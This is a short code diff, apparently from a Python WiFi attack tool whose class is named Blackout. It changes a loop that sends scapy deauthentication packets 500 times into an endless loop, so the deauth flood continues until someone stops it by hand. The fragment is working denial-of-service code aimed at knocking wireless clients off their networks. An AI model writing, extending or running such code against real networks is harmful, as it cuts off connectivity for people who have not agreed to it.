@@ -164,7 +164,7 @@ class Blackout:
             # instead use the count argument to set number of packets. However,
             # I found this to be more reliable.
             try:
-                for i in range(500):
+                while True:
                     sendp(deauth_pkt, iface=conf.iface)
 
             except KeyboardInterrupt:
